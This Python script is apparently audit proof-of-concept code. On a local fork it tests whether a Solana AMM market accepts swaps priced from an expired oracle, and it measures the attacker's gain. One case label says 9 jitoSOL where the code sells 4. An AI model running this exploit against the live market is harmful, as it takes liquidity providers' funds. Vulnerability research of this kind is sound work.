"""Busybox/Riptide: is a swap priced off an EXPIRED oracle payload still accepted?

Live mainnet state (recon/busybox_oracle_states.json, read-only) shows market
CzuQmqj4dSdaGAXrf6t2YupR3PB6Kp1urhpU8scFwmXW (jitoSOL J1toso1uCk.../ WSOL) holds
reservesA=10.9 jitoSOL, reservesB=0.5 WSOL with an OrderBook oracle (variant 3) whose
`validUntil` = 415,068,462 - i.e. ~29M slots (about 113 days) in the PAST.

An oracle-priced AMM that keeps trading on an expired price is a permissionless value-transfer
path (the embedded price_q64_64 no longer tracks the jitoSOL/WSOL exchange rate, which drifts up).
This script measures whether the deployed program rejects the swap, and if not, what the attacker
gains, with full before/after state capture. Attacker balances are fork fixture funding.
"""
import sys, json, struct, base64
sys.path.insert(0, "/home/user/orca-audit/tools")
import forknet as F
import rpc
from solders.instruction import Instruction
from solders.pubkey import Pubkey

BB = "riptK81hDxhe5pW5jSzSM9iRA8azgEgLJ4dXkPtBS7j"
actor = F.load_actor(); A = str(actor.pubkey())
MKT = "CzuQmqj4dSdaGAXrf6t2YupR3PB6Kp1urhpU8scFwmXW"
WSOL = F.WSOL


def prog_of(m):
    v = F.get_account(m) or rpc.get_account(m)
    return (v or {}).get("owner") or F.TOKEN


def ata_of(o, m, p):
    return str(Pubkey.find_program_address([bytes(F.pk(o)), bytes(F.pk(p)), bytes(F.pk(m))], F.pk(F.ATA))[0])


def raw(a):
    v = F.get_account(a)
    return None if not v else base64.b64decode(v["data"][0])


def tok(a):
    d = raw(a)
    if d is None or len(d) < 72:
        return None
    return struct.unpack_from("<Q", d, 64)[0]


def mstate(a):
    d = raw(a)
    if d is None or len(d) < 752:
        return None
    return {"disc": d[0], "bump": d[1], "cuPen": d[2], "imb": d[3],
            "authority": F.b58(d[8:40]), "updater": F.b58(d[40:72]),
            "mintA": F.b58(d[72:104]), "mintB": F.b58(d[104:136]),
            "sequence": struct.unpack_from("<Q", d, 136)[0],
            "validUntil": struct.unpack_from("<Q", d, 144)[0],
            "variant": d[152],
            "priceQ": int.from_bytes(d[153:169], "little"),
            "minSpread": struct.unpack_from("<i", d, 664)[0],
            "arbPenalty": struct.unpack_from("<I", d, 668)[0],
            "jitod": struct.unpack_from("<I", d, 672)[0],
            "minOracle": int.from_bytes(d[688:704], "little"),
            "maxOracle": int.from_bytes(d[704:720], "little"),
            "skewMin": struct.unpack_from("<i", d, 720)[0],
            "skewMax": struct.unpack_from("<i", d, 724)[0],
            "maxA": struct.unpack_from("<I", d, 728)[0],
            "maxB": struct.unpack_from("<I", d, 732)[0],
            "reservesA": struct.unpack_from("<Q", d, 736)[0],
            "reservesB": struct.unpack_from("<Q", d, 744)[0],
            "lamports": F.get_account(a)["lamports"]}


def M(k, w=False, s=False):
    return F.AM(k, writable=w, signer=s)


def swap_ix(tag, amount, is_a, partial=0, sl=None, src=None, dst=None):
    st = mstate(MKT)
    mA, mB = st["mintA"], st["mintB"]
    pa, pb = prog_of(mA), prog_of(mB)
    va, vb = ata_of(A, mA, pa), ata_of(A, mB, pb)
    mv_a, mv_b = ata_of(MKT, mA, pa), ata_of(MKT, mB, pb)
    data = bytes([tag]) + struct.pack("<Q", amount) + bytes([1 if is_a else 0])
    data += bytes([0]) if sl is None else (bytes([1]) + struct.pack("<QQ", *sl) if isinstance(sl, tuple)
                                           else bytes([2]) + struct.pack("<Q", sl))
    data += bytes([partial])
    return Instruction(F.pk(BB), data, [
        M(A, w=True, s=True), M(MKT, w=True), M(mA, w=True), M(mB, w=True),
        M(src or va, w=True), M(dst or vb, w=True), M(mv_a, w=True), M(mv_b, w=True),
        M(pa), M(pb), M(F.MEMO), M(F.IX_SYSVAR)]), st, (va, vb, mv_a, mv_b)


RES = []
LOG = []


def show(name, r, watch, before, extra=""):
    F_after = {a: tok(a) for a in watch}
    st_after = mstate(MKT)
    det = r.get("detail", {})
    logs = [l.strip() for l in det.get("logs", [])]
    rec = {"case": name, "sig": r.get("result"), "forkSlot": F.get_slot(),
           "err": det.get("err") or r.get("error"), "logs": logs,
           "tokenBefore": before, "tokenAfter": F_after, "marketBefore": before["_mstate"],
           "marketAfter": st_after, "note": extra}
    RES.append(rec)
    print(f"\n### {name}")
    print("   err:", json.dumps(rec["err"])[:150])
    print("   logs:", " | ".join(l.split("log:")[-1].strip() for l in logs if "log:" in l or "failed" in l)[:300])
    for k in before:
        if k == "_mstate":
            continue
        b, a2 = before[k] or 0, F_after[k] or 0
        if b != a2:
            print(f"   {k[:44]:46s} {b:>18,} -> {a2:>18,}  ({a2-b:+,})")
    if st_after:
        print(f"   reserves {before['_mstate']['reservesA']:,}/{before['_mstate']['reservesB']:,} -> "
              f"{st_after['reservesA']:,}/{st_after['reservesB']:,}")
    return rec


def main():
    now = F.get_slot()
    st0 = mstate(MKT)
    dA = base64.b64decode(rpc.get_account(st0["mintA"])["data"][0])[44]
    dB = base64.b64decode(rpc.get_account(st0["mintB"])["data"][0])[44]
    print(f"fork slot {now}")
    print(f"market {MKT}\n  mintA={st0['mintA']} ({dA}dp) reservesA={st0['reservesA']:,} "
          f"({st0['reservesA']/10**dA:.6f})")
    print(f"  mintB={st0['mintB']} ({dB}dp) reservesB={st0['reservesB']:,} ({st0['reservesB']/10**dB:.6f})")
    print(f"  oracle variant={st0['variant']} priceQ64.64={st0['priceQ']} (={st0['priceQ']/2**64:.9f})")
    print(f"  sequence={st0['sequence']} validUntil={st0['validUntil']} -> expired by {now-st0['validUntil']:,} slots")
    print(f"  guards minSpread={st0['minSpread']} arb={st0['arbPenalty']} jitod={st0['jitod']} "
          f"maxA={st0['maxA']} maxB={st0['maxB']} minOracle={st0['minOracle']} maxOracle={st0['maxOracle']}")
    print(f"  implied mid price B-per-A = {(st0['reservesB']/10**dB)/(st0['reservesA']/10**dA):.9f}")

    st00 = mstate(MKT)
    for mint in (st00["mintA"], st00["mintB"]):
        p_ = prog_of(mint)
        ixc = F.create_ata(A, mint, p_, A)[1]
        cr = F.send([ixc], actor)
        print("  create attacker ATA for", mint[:12], "->", json.dumps((cr.get("detail") or {}).get("err")))
    ix, st, (va, vb, mv_a, mv_b) = swap_ix(2, 400_000_000, False)   # pay 0.4 WSOL, receive jitoSOL
    watch = [va, vb, mv_a, mv_b]
    before = {k: tok(k) for k in watch}
    before["_mstate"] = st
    # the attacker needs an input balance: fork-only fixture funding of the attacker's own WSOL ATA
    v = F.get_account(vb)
    d = bytearray(base64.b64decode(v["data"][0]))
    struct.pack_into("<Q", d, 64, 100_000_000_000)
    F.rpc.rpc("surfnet_setAccount", [vb, {"lamports": v["lamports"], "data": bytes(d).hex(),
                                          "owner": v["owner"], "executable": False}], url=F.FORK)
    LOG.append({"fixtureFunding": {"account": vb, "amount": 100_000_000_000,
                "note": "attacker's own WSOL/jitoSOL balances set by fork cheatcode so the swap reaches "
                        "pricing; no protocol-owned balance was fabricated"}})
    before = {k: tok(k) for k in watch}
    before["_mstate"] = mstate(MKT)
    r = F.send([ix], actor)
    show("BB-STALE-01 swapExactIn 0.4 WSOL -> jitoSOL against an EXPIRED oracle", r, watch, before,
         "does the swap use the stale embedded price?")
    # how much jitoSOL per WSOL did the market hand over, and what is that at the *current* rate?
    got = (tok(va) or 0) - (before[va] or 0)
    paid = (before[vb] or 0) - (tok(vb) or 0)
    if got and paid:
        px = (paid / 10 ** dB) / (got / 10 ** dA)
        print(f"\n   executed: paid {paid/10**dB:.6f} WSOL, received {got/10**dA:.6f} jitoSOL"
              f"  ->  market priced jitoSOL at {px:.9f} WSOL each")
        print("   jitoSOL/SOL exchange rate rises monotonically with staking yield; a stale embedded"
              " price therefore under-prices the LST, so the profitable direction is LST-in / SOL-out.")
        # the profitable direction: sell jitoSOL into the market for WSOL
        ix2, st2, w2 = swap_ix(2, 4_000_000_000, True)      # sell 4 jitoSOL for WSOL
        # attacker needs jitoSOL; fund its own ATA (fork fixture) to exercise the same guard
        v2 = F.get_account(w2[0])
        if v2:
            d2 = bytearray(base64.b64decode(v2["data"][0]))
            struct.pack_into("<Q", d2, 64, 10_000_000_000)
            F.rpc.rpc("surfnet_setAccount", [w2[0], {"lamports": v2["lamports"], "data": bytes(d2).hex(),
                                                      "owner": v2["owner"], "executable": False}], url=F.FORK)
        b2 = {k: tok(k) for k in w2}
        b2["_mstate"] = mstate(MKT)
        r2 = F.send([ix2], actor)
        show("BB-STALE-02 swapExactIn 9 jitoSOL -> WSOL against the same expired oracle", r2, w2, b2,
             "the direction that profits from an under-priced LST")
        got_wsol = (b2[w2[1]] or 0) - (tok(w2[1]) or 0)
        print(f"\n   the market gave up {abs(got_wsol)/10**dB if got_wsol else 0:.6f} WSOL")
    json.dump({"market": MKT, "forkSlotStart": now, "decimals": [dA, dB], "results": RES,
               "log": LOG, "fundingNote": "attacker's own jitoSOL/WSOL balances set by fork cheatcode (fixture funding;"
                              " no protocol balance fabricated)"},
              open("/home/user/orca-audit/evidence/BBS_stale_oracle.json", "w"), indent=1)
    print("\nsaved evidence/BBS_stale_oracle.json")


if __name__ == "__main__":
    main()
